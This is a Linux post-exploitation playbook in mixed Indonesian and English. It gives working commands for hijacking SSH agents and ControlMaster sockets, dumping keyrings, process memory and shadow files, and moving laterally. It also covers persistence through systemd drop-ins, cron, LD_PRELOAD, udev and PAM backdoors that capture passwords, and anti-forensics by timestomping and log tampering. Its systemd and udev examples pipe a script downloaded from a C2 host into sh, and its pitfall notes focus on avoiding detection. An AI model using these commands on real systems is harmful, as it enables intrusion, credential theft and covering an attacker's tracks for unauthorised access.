# postex-linux--deep — linux

## Advanced credentials

### SSH agent socket — varian & edge case

| Scenario | Detection | Extraction |
|---|---|---|
| `SSH_AUTH_SOCK` alive in victim's shell | `env \| grep SSH_AUTH_SOCK` | `ssh-add -l` via socket |
| Agent forwarding (Attacker→Victim) | `SSH_AUTH_SOCK` in `/tmp/ssh-*/agent.*` owned by remote user | Reverse forward: `ssh -A victim 'cat'` or `socat UNIX-CONNECT:$SOCK TCP-LISTEN` |
| Agent socket but no key | `ssh-add -l` → "no identities" | Look for key in `~/.ssh/*`, passphrase-less |
| Stale socket (dead process) | `ss -xp \| grep ssh` empty | Skip; don't waste time |
| OpenSSH ≥ 8.9 | Agent uses `ssh-agent.socket` systemd user | `systemctl --user status ssh-agent` |

```bash
# Hijack agent milik user lain (butuh read pada socket dir, biasanya root)
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNN
ssh-add -L                    # dump public keys
ssh -T git@github.com         # abuse langsung
# Ekstrak private key dari agent (butuh root + ptrace atau CVE tertentu)
# ssh-agent tidak expose private key via protokol — pakai dump memory:
gdb -p $(pgrep ssh-agent) -batch -ex 'dump memory /tmp/agent.dump 0x0 0xffffffff'
strings /tmp/agent.dump | grep -A2 'BEGIN.*PRIVATE'
```

**Pitfall:** agent forwarding from server A→B; the socket on B is only valid while the SSH session A is alive. `ssh -O check` to check ControlMaster is still active before hijack.

### ControlMaster hijack

```bash
# Cari socket master
find / -type s -name '*.sock' 2>/dev/null | grep -i ssh
ls -la ~/.ssh/  # cek controlpath (biasanya ~/.ssh/cm-*)
# Pakai tanpa auth
ssh -S /tmp/ssh-cm-user@host:22 -O check host
ssh -S /tmp/ssh-cm-... host 'id'
# Atau: reuse master untuk port forward
ssh -S /tmp/cm-sock -O forward -L 8080:internal:80 host
```

Edge: master socket is usually mode 0600 owned by the user; can only be used if you are already that user (post-exploit at user level). For root→another user: `nsenter`/`runuser` is not enough — need ptrace or file permission bypass.

### Keyring / secret service

| Backend | Location | How to extract |
|---|---|---|
| GNOME Keyring | `~/.local/share/keyrings/*.keyring` | `secret-tool search --all` (requires user D-Bus session), or decrypt offline with login password |
| KWallet | `~/.local/share/kwalletd/` | `kwallet-query -l` (butuh D-Bus) |
| libsecret via D-Bus | `busctl --user` | `gdbus call --session --dest org.freedesktop.secrets ...` |
| Chromium (Linux) | `~/.config/*/Local State` + `Login Data` | os_crypt v10 = AES-CBC with key from keyring; without keyring plaintext "peanuts" |

```bash
# Keyring unlocked (user login aktif) — context: sudah jadi user itu
secret-tool search --all xdg:schema org.gnome.keyring.NetworkPassword
# Dump semua:
python3 - <<'EOF'
import secretstorage
b=secretstorage.dbus_init()
for c in secretstorage.get_all_collections(b):
    for i in c.get_all_items():
        print(i.get_label(), i.get_attributes(), i.get_secret())
EOF
```

**Pitfall:** keyring locked if session is not a graphical login (SSH-only login does not auto-unlock). Check `loginctl show-session` for `Type`/`Active`.

### /proc/kcore & memory

```bash
# Root only, atau user dgn CAP_SYS_RAWIO
ls -la /proc/kcore    # 0400 root
# Ekstrak kredensial dari memory proses target
gcore -o /tmp/dump $(pgrep -u root sshd)
strings /tmp/dump.* | grep -iE 'password|secret|token'
# PAM password di memory sshd saat login (race) — butuh timing
# Lihat juga: /proc/<pid>/mem untuk proses spesifik
dd if=/proc/$PID/mem bs=1 skip=$((0xSTART)) count=$LEN 2>/dev/null
```

Varian kernel ≥ 5.8: `/proc/kcore` bisa dibatasi `CONFIG_STRICT_DEVMEM`/`kernel.kptr_restrict=2`. `kptr_restrict=2` blok `%pK`. Cek `sysctl kernel.kptr_restrict kernel.yama.ptrace_scope`.

### /etc/shadow alternatif

```bash
# Jika root tapi shadow read-only / immutable
getent shadow                  # via NSS — bisa beda dari file
cat /etc/shadow-               # backup
cat /etc/shadow.bak /etc/shadow.old 2>/dev/null
# systemd-homed: kredensial di ~/.identity (LUKS + JSON)
cat /home/*/.identity | jq .
# SSSD cache
ldbsearch -H /var/lib/sss/db/cache_*.ldb 2>/dev/null
# Kerberos keytab
klist -kte /etc/krb5.keytab
```

## LOTL enumeration (existing binaries, without dropping tools)

| Purpose | Binary | Command |
|---|---|---|
| Enum proses+env | `ps`, `tr` | `ps eww -eo pid,user,args` |
| Find credentials in cmdline/env | `grep` | `grep -aiE 'pass\|token\|key' /proc/*/cmdline` |
| Network | `ss -tunap`, `lsof -i` | |
| File baru | `find` | `find / -xdev -mtime -1 -type f 2>/dev/null` |
| Capabilities | `getcap -r /` | |
| SUID | `find / -perm -4000 -type f` | |
| systemd unit | `systemctl list-units --all`, `systemctl cat` | |
| Journal | `journalctl -xe --no-pager` | |
| Cron | `ls -la /etc/cron.*`, `crontab -l` | |
| LXD/Docker | `lxc list`, `docker ps` | |
| Kerberos | `klist` | |
| ACL | `getfacl -R / 2>/dev/null` | |
| Immutable | `lsattr -R /etc 2>/dev/null` | |

**Pitfall:** `find /` can trigger `systemd-oomd`/audit alert; use `-xdev` and narrow scope. `getcap -r /` takes a long time — target `$(echo $PATH\|tr : ' ') /usr/local /opt`.

## Lateral movement

### SSH agent hijack (lateral)

```bash
# Dari user A (dengan agent forwarding) → host B
ssh -A victimA                     # forwarding aktif
# Di victimA, socket ada di /tmp/ssh-*/agent.*
# Di attacker, hose socket:
socat UNIX-LISTEN:/tmp/agentsock,fork UNIX-CONNECT:/tmp/ssh-XXXX/agent.123 &
export SSH_AUTH_SOCK=/tmp/agentsock
ssh-add -l                         # key milik attacker/original
ssh userB@hostB 'id'               # login sebagai userB via forwarded key
```

### ControlMaster reuse

```bash
# Master socket di host korban memungkinkan reuse tanpa auth ulang
ssh -S ~/.ssh/cm-* -O forward -R 4444:localhost:22 victim
# Tunnel ke internal
ssh -S ~/.ssh/cm-* -O forward -L 0.0.0.0:8080:internal.svc:80 victim
```

**Varian OpenSSH 9.x:** `controlpath` default `~/.ssh/cm-%r@%h:%p`; hash jika `%C`. Cari pola `cm-*`, `*.sock`.

## Advanced persistence

### systemd — varian & edge

| Tipe | Lokasi | Trigger | Jebakan |
|---|---|---|---|
| System unit | `/etc/systemd/system/*.service` | reboot + daemon-reload | `daemon-reload` requires root |
| User unit | `~/.config/systemd/user/` | login | `loginctl enable-linger` to persist outside the session |
| Timer | `*.timer` + `*.service` | schedule | `OnCalendar=` — cek `systemd-analyze calendar` |
| Path unit | `*.path` | file event | `PathExists=/tmp/x` |
| Generator | `/etc/systemd/system-generators/` | boot | executable, root |
| `ExecStartPre=` in a legitimate unit | edit existing unit | every start | `systemctl daemon-reload` required |
| Drop-in | `/etc/systemd/system/<unit>.service.d/override.conf` | config | more stealthy than a new unit |
| `.automount` | `*.automount` + mount | akses mountpoint | |

```ini
# Drop-in stealth (tidak mengubah unit asli — tidak muncul di diff)
[Service]
ExecStartPre=/bin/sh -c 'curl -s http://c2/x.sh | sh'
# atau
ExecStart=
ExecStart=/usr/local/bin/legit-looking-binary
```

**Pitfall:** `systemctl daemon-reload` triggers `inotify` on `/etc/systemd/system` on some distros (default Ubuntu auditd rule). `systemd-analyze verify` to check syntax before restarting a critical service.

### cron — varian

| Location | User | Notes |
|---|---|---|
| `/etc/cron.d/*` | `USER` field in the file | most flexible, root |
| `/etc/crontab` | field `USER` | |
| `/var/spool/cron/crontabs/<user>` | that user | `crontab -e`; don't edit directly (mtime/warning) |
| `/etc/cron.{hourly,daily,...}` | root | only executable files |
| `~/.config/systemd/user/*.timer` | user | modern alt cron |
| `anacron` | `/etc/anacrontab` | |
| `at` | `atd` queue `/var/spool/cron/atjobs/` | one-shot |

**Pitfall:** cron `%` must be escaped as `\%` in the command. `MAILTO=""` to avoid email logs. cron daemon does not auto-reload on some distros — `touch /etc/crontab`. `cron.allow`/`cron.deny` can block per user.

### LD_PRELOAD — varian

```bash
# 1. /etc/ld.so.preload (global, root)
echo /lib/libevil.so > /etc/ld.so.preload
# 2. per-service Environment=
systemctl edit svc --force
# [Service]
# Environment=LD_PRELOAD=/tmp/x.so
# 3. ~/.bashrc export (user-level)
# 4. ExecStart wrapper
# 5. /etc/environment
```

**Pitfall:** `ld.so.preload` blocks all binaries → if the .so is broken, the system bricks. Test first: `LD_PRELOAD=/tmp/x.so ls`. SELinux `allow_execmod`/`deny_execmod`; AppArmor profile per-binary. `ldconfig -p` does not show preload.

### udev — varian

| Lokasi | Vektor |
|---|---|
| `/etc/udev/rules.d/99-*.rules` | `RUN+=` |
| `/lib/udev/rules.d/` | overridden by `/etc` |
| `/etc/udev/scripts/` | script dipanggil rule |

```
ACTION=="add", SUBSYSTEM=="usb", RUN+="/bin/sh -c 'curl http://c2/x|sh'"
```

**Pitfall:** udev ≥ 250 does not run `RUN+=` for long-running; use `SYSTEMD_WANTS=` to a service. `udevadm control --reload-rules` to apply. Rules in `/run/udev/rules.d/` are volatile (lost on reboot) — good for temporary stealth.

### PAM — backdoor

```bash
# 1. pam_exec (paling stealth — tak sentuh binary PAM)
# /etc/pam.d/sshd
# auth optional pam_exec.so quiet /usr/local/bin/check.sh
# 2. Backdoor pam_unix.so
# 3. pam_exec expose_authtok (dapat password plaintext)
# auth optional pam_exec.so quiet expose_authtok /usr/local/bin/logpass
# 4. pam_userdb inject
```

**Pitfall:** `expose_authtok` is not compatible with `try_first_pass`/`use_first_pass` in the stack — requires correct order. Debian ≥ 12 hardens `pam_exec` (requires absolute path). `pam-auth-update` on Debian/Ubuntu can overwrite `/etc/pam.d/common-*` when packages are updated — backdoor lost. SELinux `authlogin` context.

## Anti-forensics

### Timestomp

```bash
# Referensi waktu dari file sah
touch -r /etc/passwd /tmp/x
# Access/Modify/Change terpisah
touch -a -d '2023-01-01 12:00' file
touch -m -d '2023-01-01 12:00' file
# ctime (Change) TIDAK bisa diset — hanya bisa dipalsukan via debugfs / clock manipulation
# debugfs (root, offline/single-user):
debugfs -w -R "set_inode_field /path ctime 20230101120000" /dev/sda1
# Atau ubah jam sistem + sentuh file + restore
date -s '2023-01-01 12:00'; touch file; hwclock -w; date -s '2024-...'; 
```

**Pitfall:** ctime & "birth time" (ext4 `crtime`) cannot be set from userspace. `statx()` reports btime. ext4 `crtime` is visible via `debugfs -R 'stat <inode>'`. Btrfs/XFS also has `crtime`. Journaling FS can leave traces of the old ctime in the journal — `debugfs`/`xfs_db` can reveal.

### Log tamper — vektor & jebakan

| Target | Vektor | Jebakan |
|---|---|---|
| `/var/log/auth.log` | `sed -i '/IP/d'` | inode/mtime changes; rsyslog may still hold the fd → writes after edit |
| journald | `journalctl --rotate`, delete `/var/log/journal/*/` | `journalctl --vacuum-time`; systemd-journald holds fd — deleting files is ineffective until restart |
| wtmp/btmp/lastlog | `utmpdump` edit then `> /var/run/utmp` | binary format; `last -f` to check |
| auditd | `auditctl -D`, stop daemon | `auditd` immutable (`-e 2`) butuh reboot |
| bash history | `HISTFILE=/dev/null`, `unset HISTFILE` | see below |
| remote syslog | forward to remote — cannot be deleted locally | detection: local logs missing but remote ones exist |
| `~/.bash_history` | `history -c` then `history -w` | timeline gap visible in `stat` |

```bash
# Journald — hapus jejak, tapi daemon masih pegang fd
systemctl stop systemd-journald; rm -rf /var/log/journal/*; systemctl start systemd-journald
# rsyslog — edit aman (stop dulu)
systemctl stop rsyslog; sed -i '/attacker/d' /var/log/auth.log; systemctl start rsyslog
# utmp/wtmp edit
utmpdump /var/log/wtmp > /tmp/wtmp.txt
# edit, lalu:
utmpdump -r /tmp/wtmp.txt > /var/log/wtmp
```

**Pitfall:** auditd with `-e 2` (immutable) → cannot be changed until reboot. `augenrules` regenerating config on restart can restore rules. Remote logs (SIEM) cannot be tampered with → pastebin first, delete, still caught. Wazuh/OSSEC FIM detects mtime/inode changes on log files.

### History evasion

```bash
# Per-sesi
unset HISTFILE
export HISTSIZE=0
set +o history
# Space di depan command (HISTCONTROL=ignorespace)
 HISTIGNORE=' *'
# Manipulasi HISTFILE
HISTFILE=/dev/null
# Timestamp spoof
HISTTIMEFORMAT='' ; history -c
# Clear + hilangkan gap
history -c; history -w
# Hapus command spesifik
history -d <offset>
```

**Pitfall:** `PROMPT_COMMAND` can log to syslog (`logger`). Bash `shopt -s histappend` → `history -c` alone is not enough. Zsh: `HISTFILE`, `SAVEHIST`, `setopt HIST_IGNORE_SPACE` differ. Fish: `fish_history` in `~/.local/share/fish/`. `sudo` commands are logged in `/var/log/auth.log` regardless of the user's history.

### Auditd / eBPF — bypass awareness

```bash
# auditctl lihat rule
auditctl -l
# Jika -e 2 (immutable): reboot untuk ubah
# eBPF (Falco/Tetragon) — detection runtime, bukan pencegahan
bpftool prog list    # cek tracer
# Bypass: hindari syscall yang di-trace (mis. pakai syscall langsung), atau unload jika root
```

## Summary table: persistent indicators per technique

| Technique | Typical artifacts | Detection |
|---|---|---|
| systemd drop-in | files in `*.service.d/` | `systemd-analyze` diff, FIM |
| `ld.so.preload` | file global | `ldconfig` tak lihat; cat file |
| PAM backdoor | `common-auth` mtime | `pam-auth-update` reset |
| udev rule | `/etc/udev/rules.d/*.rules` | `udevadm test` |
| SSH agent hijack | socket dir milik user lain diakses | `ss -xp \| grep ssh` |
| cron | entry in `crontab -l` / `cron.d` | audit rule on `/var/spool/cron` |
| timestomp | ctime ≠ mtime | `statx` btime, debugfs |

## Common operational pitfalls

- **`CAP_SYS_ADMIN`/`CAP_SYS_PTRACE`** sering diasumsikan ada; cek `capsh --print` — container sering hilangkan.
- **`/proc/PID/mem`** requires `ptrace_scope=0` or CAP_SYS_PTRACE; Yama default `1`.
- **AppArmor/SELinux** memblok akses `/proc/*/mem`, `ld.so.preload`, `pam_exec` meski root.
- **`/etc/shadow` mode 0000** in newer Ubuntu — read via `getent shadow` (requires root).
- **`/tmp` systemd `PrivateTmp=true`** isolation per service — sockets/agents in `/tmp` are not visible across services.
- **`hidepid=2`** on `/proc` → `ps eww` for other users is empty.
- **`kptr_restrict=2`** → kernel symbols in `/proc/kallsyms` are zeroed.
- **Container**: `/proc/kcore`, `/proc/1/root`, `nsenter` sering terblok seccomp; cek `capsh --print`, `/proc/self/status` `Seccomp:`.
- **`auditd immutable`** — do not edit log files without checking `auditctl -s` first; `enabled=2` cannot be reverted.
- **`journald volatile`** (`/run/log/journal`) — logs are lost on reboot; tampering is unnecessary.
- **NTP/chrony** — clock manipulation for timestomping can trigger synchronization alerts and break `crtime`/`btime` consistency.
- **FIM (AIDE/Wazuh/OSSEC)** detects mtime/inode/hash — timestomping is not enough for hashed files; even touching a file with identical content does not help.

---

## [reasoning trace]


